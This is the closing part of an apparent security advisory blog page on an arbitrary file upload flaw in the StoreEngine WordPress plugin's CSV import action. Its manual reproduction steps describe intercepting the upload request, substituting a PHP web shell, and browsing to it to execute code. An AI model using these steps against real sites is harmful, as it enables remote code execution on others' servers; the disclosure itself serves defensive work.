</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This combination allows any authenticated user to upload arbitrary files, including PHP web shells for remote code execution.</p>
<h2 id="manual-reproduction">Manual Reproduction</h2>
<ol>
<li>Login to the admin panel and navigate to the StoreEngine plugin.</li>
<li>Go to the CSV Import section (if available in the admin interface).</li>
<li>Start up Burp Suite or a similar tool and begin intercepting the traffic.</li>
<li>Attempt to upload a file and intercept the <code>POST</code> request to <code>/wp-admin/admin-ajax.php</code> calling the <code>storeengine_csv/import</code> action.</li>
<li>Modify the request to include an arbitrary file, in the example below we&rsquo;re uploading a PHP web shell.</li>
<li>Send the request and receive <code>{&quot;success&quot;:true,&quot;data&quot;:{&quot;filename&quot;:&quot;shell.php&quot;}}</code>.</li>
<li>Browse the web shell at <code>https://example.com/wp-content/uploads/storeengine_uploads/csv/shell.php</code> and execute code.</li>
</ol>

  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://ryankozak.com/posts/cve-2025-9215/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>StoreEngine Powerful WordPress eCommerce Plugin...</a>
        
	    
            <div class="next-post">
                <a href="https://ryankozak.com/posts/cve-2025-12399/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Alex Reservations: Smart Restaurant Booking &lt;=...</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  

        </div>
    </body>
</html>
